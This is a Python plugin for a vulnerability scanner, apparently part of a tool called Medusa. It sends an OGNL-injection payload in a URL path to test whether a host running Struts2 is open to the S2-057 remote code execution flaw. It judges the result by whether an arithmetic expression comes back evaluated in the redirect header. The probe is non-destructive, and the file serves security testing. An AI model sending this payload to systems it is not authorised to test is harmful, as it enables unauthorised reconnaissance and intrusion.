#!/usr/bin/env python
# _*_ coding: utf-8 _*_


import urllib.parse
import requests
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "S2_057"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload='''/struts2-showcase/$%7B233*233%7D/actionChain1.action'''


def medusa(Url,RandomAgent,ProxyIp):
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+payload
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': RandomAgent,
        'Connection': 'close',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }

    try:
        s = requests.session()
        # if ProxyIp != None:
        #     proxies = {
        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
        #         "http": "http://" + str(ProxyIp)
        #     }
        #     resp = s.get(payload_url, headers=headers, proxies=proxies,timeout=5, allow_redirects=False)
        # elif ProxyIp == None:
        resp = s.get(payload_url,headers=headers, timeout=5,allow_redirects=False)
        con = resp.headers['Location']
        code = resp.status_code
        if code==302 and con.lower().find('54289')!=-1:
            Medusa = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:版本低于<=Struts2_3_34,Struts2_5_16\r\nPayload:{}\r\n".format(url, payload_url)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (str(_t.info))
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类